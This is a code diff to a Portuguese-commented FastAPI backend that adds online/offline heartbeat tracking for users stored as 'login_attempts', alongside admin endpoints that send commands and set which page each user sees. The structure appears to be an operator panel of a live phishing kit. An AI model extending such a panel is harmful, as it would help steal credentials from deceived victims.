@@ -323,10 +323,19 @@ async def send_command(command: CommandRequest, token_data: dict = Depends(verif
 
 @api_router.get("/user/check-action/{user_id}")
 async def check_user_action(user_id: str):
-    """Usuário verifica qual ação deve realizar"""
+    """Usuário verifica qual ação deve realizar e atualiza status para online"""
     user = await db.login_attempts.find_one({"id": user_id}, {"_id": 0})
     if not user:
         return {"action": None, "page": "Página Loading...", "action_timestamp": None}
+    
+    # Atualizar status para online e timestamp do último heartbeat
+    await db.login_attempts.update_one(
+        {"id": user_id},
+        {"$set": {
+            "status": "online",
+            "last_heartbeat": datetime.now(timezone.utc).isoformat()
+        }}
+    )
     
     return {
         "action": user.get("current_action"),
@@ -335,6 +344,23 @@ async def check_user_action(user_id: str):
         "action_timestamp": user.get("action_timestamp"),
         "command_reference": user.get("command_reference")
     }
+
+# Endpoint para verificar e atualizar status offline de usuários inativos
+@api_router.post("/admin/check-offline-users")
+async def check_offline_users(token_data: dict = Depends(verify_token)):
+    """Marca usuários sem heartbeat há mais de 10 segundos como offline"""
+    cutoff_time = datetime.now(timezone.utc) - timedelta(seconds=10)
+    
+    # Buscar usuários com last_heartbeat antigo
+    await db.login_attempts.update_many(
+        {
+            "last_heartbeat": {"$lt": cutoff_time.isoformat()},
+            "status": "online"
+        },
+        {"$set": {"status": "offline"}}
+    )
+    
+    return {"message": "Status verificado"}
 
 @api_router.post("/admin/update-status/{user_id}")
 async def update_user_status(user_id: str, status: str, token_data: dict = Depends(verify_token)):
